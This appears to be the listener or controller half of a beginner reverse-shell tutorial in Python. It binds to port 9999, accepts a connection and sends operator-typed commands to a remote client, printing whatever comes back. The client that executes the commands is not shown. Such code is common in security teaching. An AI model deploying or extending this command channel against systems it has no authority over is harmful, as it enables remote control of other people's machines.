import socket
import sys


# Create Socket (allow to computer communicate)

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))


# Binding socket with port and wait for connection

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding Socket with port : " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error : " + str(msg) + "\n" + "Retrying....")
        socket_bind()


# Establish connection with client (Socket must be listening before)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " PORT | " + str(address[1]))
    send_command(conn)
    conn.close()


# Sending commands to Client

def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1028), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
